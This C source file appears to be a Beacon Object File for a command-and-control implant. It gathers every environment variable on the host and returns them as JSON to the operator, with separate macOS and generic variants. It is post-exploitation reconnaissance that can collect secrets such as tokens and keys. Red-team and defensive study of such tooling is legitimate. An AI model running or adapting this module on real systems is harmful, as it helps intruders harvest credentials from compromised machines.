#include "../includes/beacon.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

extern char **environ;

#ifdef TARGET_MACOS

void coffee(int argc, char **argv) {
    bof_result_t *result = bof_result_create(INITIAL_BUFFER_SIZE);
    if (!result) { BeaconPrintf("Error: malloc"); return; }

    bof_result_append(result, "{\"environment_variables\":{");
    int first = 1, var_count = 0;

    for (char **env = environ; *env != NULL; env++) {
        char *eq = strchr(*env, '=');
        if (!eq) continue;

        size_t name_len = (size_t)(eq - *env);
        if (name_len >= 256) continue;

        char var_name[256];
        strncpy(var_name, *env, name_len);
        var_name[name_len] = '\0';

        if (!first) bof_result_append(result, ",");
        first = 0;

        bof_field_str(result, var_name, eq + 1);
        bof_result_trim(result);
        var_count++;
    }

    bof_result_append(result, "},\"variable_count\":");
    bof_result_append_int(result, var_count);
    bof_result_append(result, "}");
    bof_result_send(result);
    bof_result_destroy(result);
}

#else

void coffee(int argc, char **argv) {
    char *output;
    int buffer_size = INITIAL_BUFFER_SIZE;
    int total_len = 0;

    output = malloc(buffer_size);
    if (output == NULL) {
        BeaconPrintf("Error: Unable to allocate memory for output buffer");
        return;
    }

    total_len += snprintf(output + total_len, buffer_size - total_len, "{\"environment_variables\":{");

    int first_entry = 1;
    int var_count = 0;

    for (char **env = environ; *env != NULL; env++) {
        char *env_string = *env;
        char *equals_pos = strchr(env_string, '=');

        if (equals_pos != NULL) {
            size_t name_len = equals_pos - env_string;
            char var_name[256];
            char *var_value = equals_pos + 1;

            if (name_len < sizeof(var_name)) {
                strncpy(var_name, env_string, name_len);
                var_name[name_len] = '\0';

                char escaped_name[512];
                char escaped_value[2048];
                json_escape(escaped_name, var_name,  sizeof(escaped_name));
                json_escape(escaped_value, var_value, sizeof(escaped_value));

                int needed_space = strlen(escaped_name) + strlen(escaped_value) + 50;
                output = ensure_buf(output, &buffer_size, total_len, needed_space);
                if (output == NULL) {
                    BeaconPrintf("Error: Unable to reallocate buffer");
                    return;
                }

                if (!first_entry) {
                    total_len += snprintf(output + total_len, buffer_size - total_len, ",");
                }
                first_entry = 0;

                total_len += snprintf(output + total_len, buffer_size - total_len,
                    "\"%s\":\"%s\"", escaped_name, escaped_value);

                var_count++;
            }
        }
    }

    total_len += snprintf(output + total_len, buffer_size - total_len,
        "},\"variable_count\":%d}", var_count);

    BeaconOutput(output, total_len);
    free(output);
}

#endif
